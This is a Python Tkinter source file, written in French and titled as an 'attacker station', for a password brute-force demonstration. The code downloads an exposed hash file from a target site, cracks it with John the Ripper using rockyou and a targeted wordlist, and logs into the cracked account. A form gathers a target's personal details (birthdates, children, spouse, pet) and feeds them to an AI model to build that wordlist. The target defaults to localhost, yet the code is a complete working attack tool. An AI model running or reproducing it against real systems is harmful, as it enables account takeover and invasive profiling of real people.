"""
INTERFACE GRAPHIQUE - POSTE ATTAQUANT (v3)
---------------------------------------------
pip install requests
python gui_attacker.py

v3 : API officielle geo.api.gouv.fr (sans clé) pour ville -> code postal,
IA nourrie avec contexte complet (mots de base + géo + notes libres).
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import subprocess
import time
import os
import json
import requests

from osint_wordlist import ProfilCible, generer_dictionnaire

CONFIG_FILE = "gui_config.json"
DEFAULT_ROCKYOU_CANDIDATES = ["rockyou.txt", "/usr/share/wordlists/rockyou.txt"]

POLICE_BASE = ("Segoe UI", 10)
POLICE_TITRE = ("Segoe UI Semibold", 11)
POLICE_LOG = ("Consolas", 10)

COULEUR_FOND = "#f4f5f7"
COULEUR_ACCENT = "#2f6fed"
COULEUR_LOG_FOND = "#1e1e2e"
COULEUR_LOG_TEXTE = "#d9dce3"
COULEUR_LOG_OK = "#7ee787"
COULEUR_LOG_ERREUR = "#ff7b72"
COULEUR_LOG_INFO = "#8ab4f8"


# ---------------------------- logique d'attaque ----------------------------

def recuperer_hash(target_url, log, out_file="hash_recupere.txt"):
    url = target_url.rstrip("/") + "/backup/users.txt"
    log(f"[*] Récupération du hash exposé : {url}")
    r = requests.get(url, timeout=5)
    if r.status_code != 200:
        log("[!] Impossible de récupérer le hash.")
        return None
    with open(out_file, "w") as f:
        f.write(r.text)
    log(f"[+] Hash récupéré : {r.text.strip()}")
    return out_file


def lancer_john(hash_file, wordlist, fmt, john_bin, log):
    log(f"[*] John the Ripper (format={fmt}, dico={wordlist})")
    debut = time.time()
    subprocess.run([john_bin, f"--format={fmt}",
                    f"--wordlist={wordlist}", hash_file], check=False)
    duree = time.time() - debut

    result = subprocess.run([john_bin, f"--format={fmt}", "--show", hash_file],
                             capture_output=True, text=True)
    log("[*] Résultat John :\n" + result.stdout)

    cracked = None
    for line in result.stdout.splitlines():
        if ":" in line and not line.startswith(("0 password", "1 password")):
            login, pwd = line.split(":", 1)
            cracked = (login, pwd)
            break
    return cracked, duree


def compter_tentatives(wordlist, password, log):
    log("[*] Calcul du rang dans le dictionnaire...")
    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            for i, ligne in enumerate(f, start=1):
                if ligne.rstrip("\r\n") == password:
                    return i
    except FileNotFoundError:
        pass
    return None


def se_connecter(target_url, login, password, log):
    log(f"[*] Connexion test sur {target_url} avec {login}:{password}")
    s = requests.Session()
    r = s.post(target_url, data={"login": login, "password": password},
               allow_redirects=True)
    ok = "Accès administrateur confirmé" in r.text
    return ok


def ecrire_rapport(login, password, duree, acces_ok, tentatives,
                    mot_dico=None, path="rapport_bruteforce.txt"):
    with open(path, "w", encoding="utf-8") as f:
        f.write("=== RAPPORT DE DEMONSTRATION - BRUTEFORCE DICTIONNAIRE ===\n")
        f.write(f"Login ciblé       : {login}\n")
        f.write(f"Mot de passe trouvé : {password}\n")
        f.write(f"Durée du cassage  : {duree:.4f} secondes\n")
        if mot_dico:
            f.write(f"Dictionnaire victorieux : {mot_dico}\n")
        if tentatives:
            debit = tentatives / duree if duree > 0 else float("inf")
            f.write(f"Nombre de tentatives (rang dans le dico) : {tentatives}\n")
            f.write(f"Débit estimé : {debit:,.0f} mots/seconde\n".replace(",", " "))
        else:
            f.write("Nombre de tentatives : non déterminé\n")
        f.write(f"Accès compte confirmé : {'OUI' if acces_ok else 'NON'}\n")


def ecrire_rapport_echec(path="rapport_bruteforce.txt"):
    with open(path, "w", encoding="utf-8") as f:
        f.write("=== RAPPORT DE DEMONSTRATION - BRUTEFORCE DICTIONNAIRE ===\n")
        f.write("Résultat : MOT DE PASSE NON TROUVÉ\n")
        f.write("Dictionnaires essayés : OSINT ciblé puis rockyou.txt (fallback)\n")


def executer_attaque(target_url, wordlist, rockyou_path, john_bin, fmt, log):
    hash_file = recuperer_hash(target_url, log)
    if not hash_file:
        return

    # ÉTAPE 1 : dico OSINT ciblé
    log("")
    log("[*] ====== ÉTAPE 1/2 : dictionnaire OSINT ciblé ======")
    cracked, duree = lancer_john(hash_file, wordlist, fmt, john_bin, log)
    mot_dico = wordlist

    # ÉTAPE 2 : fallback rockyou
    if not cracked and rockyou_path and os.path.exists(rockyou_path) \
            and rockyou_path != wordlist:
        log("")
        log(f"[*] ====== ÉTAPE 2/2 : fallback {rockyou_path} ======")
        cracked, duree = lancer_john(hash_file, rockyou_path, fmt, john_bin, log)
        mot_dico = rockyou_path

    if not cracked:
        log("")
        log("[!] MOT DE PASSE NON TROUVÉ (ni OSINT ni rockyou).")
        ecrire_rapport_echec()
        log("[!] Rapport d'échec écrit dans rapport_bruteforce.txt")
        return

    login, password = cracked
    log("")
    log(f"[+++] MOT DE PASSE TROUVÉ : {login}:{password}  (en {duree:.3f}s)")

    acces_ok = se_connecter(target_url, login, password, log)
    log("[+] Accès au compte confirmé !" if acces_ok
        else "[!] Connexion échouée.")

    tentatives = compter_tentatives(mot_dico, password, log)
    if tentatives:
        debit = tentatives / duree if duree > 0 else float("inf")
        log(f"[+] Rang dans le dictionnaire : {tentatives} tentatives")
        log(f"[+] Débit estimé : {debit:,.0f} mots/seconde".replace(",", " "))

    ecrire_rapport(login, password, duree, acces_ok, tentatives,
                    mot_dico=mot_dico)
    log("[+] Rapport écrit dans rapport_bruteforce.txt")


# ---------------------------- Interface Tkinter ----------------------------

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Démo Bruteforce — Poste attaquant")
        self.geometry("820x680")
        self.minsize(720, 560)
        self.configure(bg=COULEUR_FOND)

        self._init_style()
        self.config_data = self._charger_config()
        self._construire_interface()

    def _init_style(self):
        style = ttk.Style(self)
        try:
            style.theme_use("clam")
        except tk.TclError:
            pass

        style.configure(".", font=POLICE_BASE, background=COULEUR_FOND)
        style.configure("TFrame", background=COULEUR_FOND)
        style.configure("TLabelframe", background=COULEUR_FOND, borderwidth=1)
        style.configure("TLabelframe.Label", font=POLICE_TITRE,
                         background=COULEUR_FOND, foreground="#333333")
        style.configure("TLabel", background=COULEUR_FOND)
        style.configure("TRadiobutton", background=COULEUR_FOND)
        style.configure("TCheckbutton", background=COULEUR_FOND)
        style.configure("Accent.TButton", font=("Segoe UI Semibold", 11), padding=10)
        style.map("Accent.TButton",
                  background=[("!disabled", COULEUR_ACCENT)],
                  foreground=[("!disabled", "white")])
        style.configure("TButton", padding=6)

    def _charger_config(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE) as f:
                    return json.load(f)
            except Exception:
                pass
        return {}

    def _sauver_config(self):
        with open(CONFIG_FILE, "w") as f:
            json.dump({
                "john_bin": self.var_john.get(),
                "target": self.var_target.get(),
                "format": self.var_format.get(),
            }, f)

    def _construire_interface(self):
        pad = {"padx": 10, "pady": 6}

        conteneur = ttk.Frame(self)
        conteneur.pack(fill="both", expand=True, padx=12, pady=12)

        # --- Cible ---
        frame_cible = ttk.LabelFrame(conteneur, text="🎯  Cible")
        frame_cible.pack(fill="x", **pad)
        frame_cible.columnconfigure(1, weight=1)

        ttk.Label(frame_cible, text="URL du client :").grid(
            row=0, column=0, sticky="w", padx=8, pady=4)
        self.var_target = tk.StringVar(
            value=self.config_data.get("target", "http://127.0.0.1:5000"))
        ttk.Entry(frame_cible, textvariable=self.var_target).grid(
            row=0, column=1, columnspan=2, sticky="we", padx=8, pady=4)

        ttk.Label(frame_cible, text="Format de hash :").grid(
            row=1, column=0, sticky="w", padx=8, pady=4)
        self.var_format = tk.StringVar(
            value=self.config_data.get("format", "raw-md5"))
        ttk.Combobox(frame_cible, textvariable=self.var_format,
                     values=["raw-md5", "raw-sha1", "raw-sha256", "nt"],
                     width=18, state="readonly").grid(
            row=1, column=1, sticky="w", padx=8, pady=4)

        # --- John ---
        frame_john = ttk.LabelFrame(conteneur, text="🔑  John the Ripper")
        frame_john.pack(fill="x", **pad)
        frame_john.columnconfigure(1, weight=1)

        ttk.Label(frame_john, text="Chemin john.exe :").grid(
            row=0, column=0, sticky="w", padx=8, pady=4)
        self.var_john = tk.StringVar(
            value=self.config_data.get("john_bin", "john"))
        ttk.Entry(frame_john, textvariable=self.var_john).grid(
            row=0, column=1, sticky="we", padx=8, pady=4)
        ttk.Button(frame_john, text="Parcourir…",
                   command=self._choisir_john).grid(
            row=0, column=2, padx=8, pady=4)

        # --- Dictionnaire ---
        frame_dico = ttk.LabelFrame(conteneur, text="📖  Dictionnaire")
        frame_dico.pack(fill="x", **pad)
        frame_dico.columnconfigure(1, weight=1)

        self.var_mode_dico = tk.StringVar(value="rockyou")
        ttk.Radiobutton(frame_dico, text="rockyou.txt (par défaut)",
                         variable=self.var_mode_dico, value="rockyou",
                         command=self._maj_mode_dico).grid(
            row=0, column=0, sticky="w", padx=8, pady=3)
        ttk.Radiobutton(frame_dico, text="Fichier personnalisé",
                         variable=self.var_mode_dico, value="fichier",
                         command=self._maj_mode_dico).grid(
            row=1, column=0, sticky="w", padx=8, pady=3)
        ttk.Radiobutton(frame_dico, text="Dico ciblé — profil OSINT",
                         variable=self.var_mode_dico, value="osint",
                         command=self._maj_mode_dico).grid(
            row=2, column=0, sticky="w", padx=8, pady=3)

        self.var_wordlist = tk.StringVar(value=self._trouver_rockyou())
        self.entry_wordlist = ttk.Entry(frame_dico, textvariable=self.var_wordlist)
        self.entry_wordlist.grid(row=0, column=1, columnspan=2,
                                  sticky="we", padx=8, pady=3)
        self.btn_parcourir_dico = ttk.Button(
            frame_dico, text="Parcourir…", command=self._choisir_dico)
        self.btn_parcourir_dico.grid(row=1, column=1, sticky="w", padx=8, pady=3)
        self.btn_profil_osint = ttk.Button(
            frame_dico, text="Ouvrir le formulaire profil…",
            command=self._ouvrir_formulaire_osint)
        self.btn_profil_osint.grid(row=2, column=1, sticky="w", padx=8, pady=3)
        self._maj_mode_dico()

        # --- Lancement ---
        ttk.Button(conteneur, text="▶  LANCER L'ATTAQUE",
                   style="Accent.TButton",
                   command=self._lancer).pack(pady=12)

        # --- Log ---
        frame_log = ttk.LabelFrame(conteneur, text="🖥  Journal")
        frame_log.pack(fill="both", expand=True, **pad)
        self.txt_log = scrolledtext.ScrolledText(
            frame_log, height=16, font=POLICE_LOG,
            bg=COULEUR_LOG_FOND, fg=COULEUR_LOG_TEXTE,
            insertbackground="white", borderwidth=0, padx=10, pady=8,
        )
        self.txt_log.pack(fill="both", expand=True, padx=4, pady=4)
        self.txt_log.tag_configure("ok", foreground=COULEUR_LOG_OK)
        self.txt_log.tag_configure("erreur", foreground=COULEUR_LOG_ERREUR)
        self.txt_log.tag_configure("info", foreground=COULEUR_LOG_INFO)

    def _trouver_rockyou(self):
        for c in DEFAULT_ROCKYOU_CANDIDATES:
            if os.path.exists(c):
                return c
        return "rockyou.txt"

    def _maj_mode_dico(self):
        mode = self.var_mode_dico.get()
        if mode == "rockyou":
            self.var_wordlist.set(self._trouver_rockyou())
            self.btn_parcourir_dico.configure(state="disabled")
            self.btn_profil_osint.configure(state="disabled")
        elif mode == "fichier":
            self.btn_parcourir_dico.configure(state="normal")
            self.btn_profil_osint.configure(state="disabled")
        else:
            self.btn_parcourir_dico.configure(state="disabled")
            self.btn_profil_osint.configure(state="normal")

    def _choisir_john(self):
        f = filedialog.askopenfilename(
            title="Choisir john.exe",
            filetypes=[("Exécutable", "*.exe"), ("Tous", "*.*")])
        if f:
            self.var_john.set(f)

    def _choisir_dico(self):
        f = filedialog.askopenfilename(
            title="Choisir un dictionnaire",
            filetypes=[("Texte", "*.txt"), ("Tous", "*.*")])
        if f:
            self.var_wordlist.set(f)

    def _log(self, message):
        tag = None
        if message.startswith("[+++]") or message.startswith("[+]"):
            tag = "ok"
        elif message.startswith("[!]"):
            tag = "erreur"
        elif message.startswith("[*]") or message.startswith("[IA]") \
                or message.startswith("[GEO"):
            tag = "info"
        self.txt_log.insert("end", message + "\n", tag)
        self.txt_log.see("end")
        self.update_idletasks()

    def _ouvrir_formulaire_osint(self):
        FormulaireOSINT(self, on_valide=self._dictionnaire_osint_genere)

    def _dictionnaire_osint_genere(self, chemin, nb_mots):
        self.var_wordlist.set(chemin)
        self._log(f"[+] Dictionnaire OSINT généré : {chemin} ({nb_mots} mots)")

    def _lancer(self):
        self._sauver_config()
        target = self.var_target.get().strip()
        wordlist = self.var_wordlist.get().strip()
        john_bin = self.var_john.get().strip()
        fmt = self.var_format.get().strip()
        rockyou = self._trouver_rockyou()

        if not target or not wordlist or not john_bin:
            messagebox.showerror(
                "Erreur",
                "Merci de remplir URL, dictionnaire et chemin John.")
            return
        if not os.path.exists(wordlist):
            messagebox.showerror("Erreur",
                                 f"Dictionnaire introuvable : {wordlist}")
            return

        self.txt_log.delete("1.0", "end")
        self._log(f"[*] Dictionnaire principal : {wordlist}")
        if rockyou and os.path.exists(rockyou) and rockyou != wordlist:
            self._log(f"[*] Fallback activé : {rockyou}")
        else:
            self._log("[!] Pas de rockyou.txt trouvé -> fallback désactivé.")

        threading.Thread(
            target=executer_attaque,
            args=(target, wordlist, rockyou, john_bin, fmt, self._log),
            daemon=True,
        ).start()


# ------------------------- Formulaire OSINT (onglets) -------------------------

class FormulaireOSINT(tk.Toplevel):
    """Formulaire en onglets pour saisir le profil OSINT et générer
    un dictionnaire ciblé."""

    def __init__(self, parent, on_valide):
        super().__init__(parent)
        self.title("Profil OSINT de la cible")
        self.geometry("560x640")
        self.minsize(520, 560)
        self.configure(bg=COULEUR_FOND)
        self.on_valide = on_valide
        self.vars = {}

        ttk.Label(self,
                  text="Renseigne ce que tu sais (réseaux sociaux, photos, "
                       "discussions...). Une estimation vaut mieux que rien — "
                       "laisse vide ce que tu ignores. La ville déclenche "
                       "une recherche automatique via l'API officielle.",
                  wraplength=520, justify="left").pack(
            fill="x", padx=14, pady=(12, 6))

        notebook = ttk.Notebook(self)
        notebook.pack(fill="both", expand=True, padx=14, pady=6)

        onglet_identite = ttk.Frame(notebook, padding=14)
        onglet_famille = ttk.Frame(notebook, padding=14)
        onglet_passions = ttk.Frame(notebook, padding=14)
        onglet_ia = ttk.Frame(notebook, padding=14)

        notebook.add(onglet_identite, text="  👤 Identité  ")
        notebook.add(onglet_famille, text="  👪 Famille  ")
        notebook.add(onglet_passions, text="  🎯 Pro & Passions  ")
        notebook.add(onglet_ia, text="  🤖 Notes & IA  ")

        self._champs_simples(onglet_identite, [
            ("prenom", "Prénom"),
            ("nom", "Nom"),
            ("surnom", "Surnom / pseudo"),
            ("reseaux_pseudo", "Pseudo réseaux sociaux"),
            ("ville", "Ville"),
            ("date_naissance", "Date de naissance exacte (JJ/MM/AAAA)"),
            ("age_estime", "...ou âge ESTIMÉ (ex: '30-35')"),
            ("date_mariage", "Date de mariage si connue"),
        ])

        self._champs_simples(onglet_famille, [
            ("conjoint", "Prénom du conjoint"),
            ("date_naissance_conjoint", "Naissance du conjoint (JJ/MM/AAAA)"),
            ("enfants", "Prénoms des enfants (virgules)"),
            ("dates_naissance_enfants", "Leurs dates de naissance (virgules)"),
            ("parents", "Parents / fratrie (prénoms, virgules)"),
            ("animal", "Nom de l'animal"),
        ])

        self._champs_simples(onglet_passions, [
            ("metier", "Métier"),
            ("entreprise", "Entreprise"),
            ("equipe_sport", "Équipe de sport / passion"),
            ("artiste_prefere", "Artiste / groupe préféré"),
            ("vehicule", "Véhicule (marque/modèle)"),
            ("couleur_preferee", "Couleur préférée"),
        ])

        # --- Onglet Notes & IA ---
        ttk.Label(onglet_ia,
                  text="Notes libres (hobbies, détails visuels, style...) :"
                  ).grid(row=0, column=0, columnspan=2, sticky="w", pady=(0, 2))
        self.vars["mots_libres"] = tk.StringVar()
        ttk.Entry(onglet_ia, textvariable=self.vars["mots_libres"], width=48
                  ).grid(row=1, column=0, columnspan=2, sticky="we", pady=(0, 14))

        frame_ia = ttk.LabelFrame(onglet_ia, text="Enrichissement IA")
        frame_ia.grid(row=2, column=0, columnspan=2, sticky="we")

        self.var_ia = tk.BooleanVar(value=True)
        ttk.Checkbutton(frame_ia, text="Activer l'enrichissement IA",
                         variable=self.var_ia).grid(
            row=0, column=0, columnspan=2, sticky="w", padx=8, pady=6)

        ttk.Label(frame_ia, text="Fournisseur :").grid(
            row=1, column=0, sticky="w", padx=8)
        self.var_provider = tk.StringVar(value="ollama")
        combo_provider = ttk.Combobox(
            frame_ia, textvariable=self.var_provider,
            values=["ollama", "anthropic", "deepseek"],
            width=15, state="readonly")
        combo_provider.grid(row=1, column=1, sticky="w", padx=8)
        combo_provider.bind("<<ComboboxSelected>>", self._maj_champ_cle)

        ttk.Label(frame_ia,
                  text="Clé API (vide = variable d'environnement) :"
                  ).grid(row=2, column=0, sticky="w", padx=8, pady=4)
        self.var_api_key = tk.StringVar()
        self.entry_api_key = ttk.Entry(
            frame_ia, textvariable=self.var_api_key, width=28, show="*")
        self.entry_api_key.grid(row=2, column=1, sticky="w", padx=8, pady=4)

        ttk.Label(frame_ia, text="Modèle Ollama :").grid(
            row=3, column=0, sticky="w", padx=8, pady=4)
        self.var_modele_ollama = tk.StringVar(value="gemma4:31b-cloud")
        ttk.Entry(frame_ia, textvariable=self.var_modele_ollama, width=28
                  ).grid(row=3, column=1, sticky="w", padx=8, pady=4)

        ttk.Label(frame_ia,
                  text="⚠ Clé jamais écrite sur disque. Avec Ollama, "
                       "aucune clé requise.",
                  foreground="gray", wraplength=460).grid(
            row=4, column=0, columnspan=2, padx=8, pady=(2, 8))

        self._maj_champ_cle()

        # --- Bouton générer ---
        bas = ttk.Frame(self)
        bas.pack(fill="x", padx=14, pady=(4, 14))
        ttk.Button(bas, text="✨  Générer le dictionnaire",
                   style="Accent.TButton",
                   command=self._generer).pack(fill="x")

    def _champs_simples(self, parent, champs):
        parent.columnconfigure(1, weight=1)
        for i, (cle, label) in enumerate(champs):
            ttk.Label(parent, text=label + " :").grid(
                row=i, column=0, sticky="w", pady=5)
            var = tk.StringVar()
            ttk.Entry(parent, textvariable=var).grid(
                row=i, column=1, sticky="we", padx=(10, 0), pady=5)
            self.vars[cle] = var

    def _maj_champ_cle(self, event=None):
        if self.var_provider.get() == "ollama":
            self.entry_api_key.configure(state="disabled")
        else:
            self.entry_api_key.configure(state="normal")

    def _generer(self):
        v = {k: var.get().strip() for k, var in self.vars.items()}

        def liste(cle):
            return [x.strip() for x in v.get(cle, "").split(",") if x.strip()]

        profil = ProfilCible(
            prenom=v["prenom"], nom=v["nom"], surnom=v["surnom"],
            reseaux_pseudo=v["reseaux_pseudo"], ville=v["ville"],
            date_naissance=v["date_naissance"], age_estime=v["age_estime"],
            date_mariage=v["date_mariage"],
            conjoint=v["conjoint"],
            date_naissance_conjoint=v["date_naissance_conjoint"],
            enfants=liste("enfants"),
            dates_naissance_enfants=liste("dates_naissance_enfants"),
            parents=liste("parents"), animal=v["animal"],
            metier=v["metier"], entreprise=v["entreprise"],
            equipe_sport=v["equipe_sport"],
            artiste_prefere=v["artiste_prefere"], vehicule=v["vehicule"],
            couleur_preferee=v["couleur_preferee"],
            mots_libres=liste("mots_libres"),
        )

        chemin = "dico_osint_cible.txt"
        nb = generer_dictionnaire(
            profil, chemin,
            utiliser_ia=self.var_ia.get(),
            provider=self.var_provider.get(),
            api_key=self.var_api_key.get().strip(),
            modele_ollama=self.var_modele_ollama.get().strip() or "gemma4:31b-cloud",
            debug=True,
        )
        self.on_valide(chemin, nb)
        self.destroy()


if __name__ == "__main__":
    App().mainloop()